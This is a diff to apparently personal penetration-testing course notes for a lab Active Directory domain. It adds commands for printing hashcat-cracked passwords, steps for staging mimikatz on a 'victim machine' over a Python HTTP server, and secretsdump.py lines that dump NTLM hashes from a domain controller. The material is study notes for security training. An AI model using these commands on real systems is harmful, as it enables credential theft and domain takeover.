@@ -148,6 +148,11 @@ if you need to use a module that you don't know:
 `hashcast --help | grep protocol`
 and look for module number for the protocol that you need
 
+if you are decrypting multiple hashes
+=>
+after hashcat finish -->  retype the command with `--show`
+`hashcat -m 0 file_with_hash.txt /path/wordlist.txt --show` -->  this will print only the pwds
+
 
 > [!WARNING] 
 > hashcat is heavy on GPU => it's bettere to avoid it inside a VM
@@ -264,6 +269,17 @@ to install it:
 - download the latest mimikatz_trunk.zip
 - extract it
 - run the x64/mimikatz.exe -->  inside a privileged cmd (`mimikatz.exe`)
+
+#### Install mimikatz on victim machine
+<span style="background:#fff88f">to install it on the victim machine:</span>
+- repeat all the steps in your attacker machine until extract the file
+- cd to the x64 folder
+- `python3 -m http.server 80`
+- from the victim pc:
+	- open the browser and type the attacker IP
+	- download all the files in that folder
+	- open a privileged CMD > navigate in the Download folder > run `mimikatz.exe`
+  
 
 #### Sekurlsa
 [[Notes_ETH#sekurlsa|sekurlsa]]
@@ -407,6 +423,11 @@ example:
 #### secretsdump
 tools for looking for hash for accounts
 `secretsdump.py MARVEL.local/fcastle:'Password1'@172.16.214.130`
+
+dumping the NTDS.dit:   (that contains all the hashes)
+`secretsdump.py MARVEL.local/hawkeye:'Password1@'@172.16.214.128 -just-dc-ntlm`
+`172.16.214.128` -->  Domain Controller IP
+you must have access an admin account
 
 ####  GetUserSPNs
 Can be used to obtain a password hash for user accounts that have an SPN (service principal name)
